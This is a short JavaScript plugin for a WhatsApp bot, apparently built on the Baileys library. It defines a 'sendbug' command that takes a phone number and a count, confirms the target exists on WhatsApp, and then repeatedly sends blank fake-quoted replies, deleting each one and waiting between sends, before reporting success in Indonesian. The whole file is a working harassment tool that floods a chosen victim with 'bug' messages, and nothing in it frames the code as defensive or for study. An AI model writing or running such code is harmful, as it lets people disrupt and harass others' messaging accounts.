import { delay } from 'baileys'

let handler = async (m, { conn, text, isOwner, usedPrefix: _p, command: cmd }) => {
	if (m.isGroup && !isOwner) return
	let [target, total] = text.split`|`
	if (!(target && total)) throw `Ex: ${_p}${cmd} +62 8xx-xxxx-xxxx|jumlah`
	target = target.replace(/\D/g, '') + '@s.whatsapp.net'
	let data = (await conn.onWhatsApp(target))[0] || {}
	if (!data || !data?.exists) throw `Nomor "${target}" tidak terdaftar`
	if (!total.isNumber()) throw 'Jumlah harus berupa angka'
	for (let x = 0; x < total; x++) {
		let msg = await conn.fakeReply(data.jid, ' ', '0@s.whatsapp.net', ' ', ' ')
		await conn.sendMessage(data.jid, { delete: { ...msg.key }})
		await delay(10000)
	}
	m.reply(`Sukses mengirim bug ke "${target}" sebanyak ${total} kali`)
}
handler.command = /^sendbug$/i
// handler.rowner = true

export default handler